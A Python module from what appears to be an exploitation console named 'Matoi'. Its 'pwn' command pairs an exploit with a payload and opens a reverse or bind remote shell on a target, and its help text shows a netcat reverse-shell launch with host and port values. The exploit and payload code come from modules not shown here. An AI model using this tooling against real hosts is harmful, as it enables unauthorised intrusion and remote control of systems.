import typing
from pytoolcore import style, netutils, exception, command, engine
from core import blueprintregister, exploitcore, payloadcore, shellcore


class Matoi(engine.Engine):
    MODNAME: str = "Matoi"
    AUTHOR: str = "Danakane"

    REVERSE: str = "reverse"
    BIND: str = "bind"

    def __init__(self, parentref: str, parentname: str, exploit: exploitcore.Exploit,
                 shellreg: blueprintregister.ShellRegister,
                 payloadreg: blueprintregister.PayloadRegister) -> None:
        moduleref: str = parentref + "(" + style.Style.bold(style.Style.red(exploit.ref)) + ")"
        super(Matoi, self).__init__(moduleref=moduleref,
                                    modulename=exploit.ref,
                                    author=exploit.author)
        self.__parentname__: str = parentname
        self.__exploit__: exploitcore.Exploit = exploit
        self.__shellreg__: blueprintregister.ShellRegister = shellreg
        self.__payloadreg__: blueprintregister.PayloadRegister = payloadreg

        # Defining the Matoi's variables
        self.addvar(varname="PAYLOAD",
                    description="The payload to use",
                    settable=True, value="")

        self.addvar(varname="LHOST",
                    description="The local host name or address",
                    settable=True, value="")

        self.addvar(varname="LPORT",
                    description="The local host port number to use",
                    settable=True, value="")

        self.addvar(varname="RHOST",
                    description="The remote host name or address",
                    settable=True, value="")

        self.addvar(varname="RPORT",
                    description="The remote host port number to use",
                    settable=True, value="")

        # Defining the module's commands
        # set command
        cmdset: command.Command = command.Command(cmdname="set", nbpositionals=2,
                                                  completionlist=list(self.__dictvar__.keys()))
        sethelp: str = "Description : set a variable with a value\n" + \
                       "Usage : set {variable} {value}\n" + \
                       "Note : use 'show options' " + \
                       "to display settable variable"
        self.addcmd(cmd=cmdset, fct=self.set, helpstr=sethelp)

        # show command
        cmdshow: command.Command = command.Command(cmdname="show", nbpositionals=1,
                                                   completionlist=["commands", "name",
                                                                   "author", "options", "payloads"])
        showhelp: str = "Description : display option(s), command(s) and attack(s)\n" + \
                        "Usage : show {keyword} \n" + \
                        "Note :\n" + \
                        "\tuse 'show name' to display module's name\n" + \
                        "\tuse 'show author' to display module's author\n" + \
                        "\tuse 'show commands' to display the module's commands\n" + \
                        "\tuse 'show payloads' to display the available payloads" + \
                        "\tuse 'show options' to display valid keywords\n"
        self.addcmd(cmd=cmdshow, fct=self.show, helpstr=showhelp)

        # pwn command
        argpayload: command.Argument = command.Argument(argname="payload", hasvalue=True, optional=True)
        arglhost: command.Argument = command.Argument(argname="lhost", hasvalue=True, optional=True)
        arglport: command.Argument = command.Argument(argname="lport", hasvalue=True, optional=True)
        argrhost: command.Argument = command.Argument(argname="rhost", hasvalue=True, optional=True)
        argrport: command.Argument = command.Argument(argname="rport", hasvalue=True, optional=True)

        pwnargs = [argpayload, arglhost, arglport, argrhost, argrport]

        cmdrun: command.Command = command.Command(cmdname="pwn", nargslist=pwnargs, nbpositionals=0)

        runhelp: str = "Description : pwn " + exploit.ref + \
                       " exploit with the given parameters\n" + \
                       "Usage : pwn [option][value] \n" + \
                       "Options list : payload, lhost, lport, " + \
                       "rhost, rport\n" + \
                       "Note : \n" + \
                       "\toption payload : the payload to use\n" + \
                       "\toption lhost : local host\n" + \
                       "\toption lport : local host port number to use\n" + \
                       "\toption rhost : remote host\n" + \
                       "\toption rport : remote host target port number\n" + \
                       "Example : pwn payload reverse/linux_netcat " + \
                       "rhost 192.168.1.92 rport 1025 " + \
                       "lhost 192.168.1.84 lport 5555"

        self.addcmd(cmd=cmdrun, fct=self.pwn, helpstr=runhelp)

    def set(self, varname, value) -> None:
        varname = varname.upper()
        if "PORT" in varname:
            if int(value) not in range(1, 65536):
                raise ValueError("Invalid port number " + value)
            self.setvar(varname=varname, value=value)
        elif "PAYLOAD" == varname:
            if value in self.__exploit__.comploads:
                self.setvar(varname=varname, value=value)
            else:
                raise ValueError(value + " is not a compatible payload for " +
                                 self.__exploit__.ref)
        else:
            self.setvar(varname=varname, value=value)

    def show(self, keyword: str) -> None:
        keyword = keyword.upper()
        if keyword == "PAYLOADS":
            payloadlist: typing.List[str] = self.__exploit__.comploads
            availableploads: typing.List[str] = self.__payloadreg__.list
            print(style.Style.info(self.__exploit__.ref + " compatible payloads"))
            for payloadref in payloadlist:
                if payloadref in availableploads:
                    print(payloadref)
        else:
            super(Matoi, self).show(keyword)

    def pwn(self, payload: str = "", lhost: str = "", lport: str = "",
            rhost: str = "", rport: str = "") -> None:
        rportstr: str = rport
        lportstr: str = lport
        payloadref: str = payload
        if not payloadref:
            print(style.Style.warning("No payload provided, " +
                                      self.__parentname__ + " will use PAYLOAD " +
                                      "as payload"))
            payloadref = self.getvar("PAYLOAD")
            if not payloadref:
                raise ValueError("PAYLOAD variable is empty")
        if not lhost:
            lhost = self.getvar("LHOST")
        if not lportstr:
            lportstr = self.getvar("LPORT")
        if not rhost:
            print(style.Style.warning("No remote host address provided, " +
                                      self.__parentname__ + " will use RHOST " +
                                      "as remote host"))
            rhost = self.getvar("RHOST")
            if not rhost:
                raise ValueError("RHOST variable is empty")
        if not rportstr:
            print(style.Style.warning("No remote port number provided, " +
                                      self.__parentname__ + " will use RPORT " +
                                      "as remote port number"))
            rportstr = self.getvar("RPORT")
            if not rportstr:
                raise ValueError("RPORT variable is empty")

        rhost = netutils.gethostaddrbyname(rhost)
        if lhost:
            lhost = netutils.gethostaddrbyname(lhost)

        rport: int = int(rportstr)
        lport: int = 0
        if lportstr:
            lport = int(lportstr)

        payload: str = payloadref
        payload: payloadcore.Payload = self.__payloadreg__[payload]()
        payload.setup(lhost, lport)
        exploit: exploitcore.Exploit = self.__exploit__.generate(payload)
        kwargs: typing.Dict[str, typing.Any] = {"exploit": exploit,
                                                "rhost": rhost, "rport": rport}
        if payloadref.split("/")[0] == Matoi.REVERSE:
            kwargs["lhost"] = lhost
            kwargs["lport"] = lport
        shell: shellcore.RemoteShell = self.__shellreg__[payload.shellname](**kwargs)
        try:
            shell.run()
        except OSError as err:
            raise (exception.CException(str(err)))

    def completer(self, text: str, state: int) -> str:
        subtext: str = text.split(" ")[-1].lower()
        if len(text.split(" ")) > 2 and text.split(" ")[-2].lower() == "payload":
            wordslist = self.__payloadreg__.list
            retlist: typing.List[str] = text.split(" ")[:-1]
            retlist.append([x for x in wordslist if x.lower().startswith(subtext, 0) and
                            x.lower() not in text.lower().split(" ") and
                            (subtext.strip() != "")][state])
            res: str = " ".join(retlist)
        else:
            res: str = super(Matoi, self).completer(text, state)
        return res
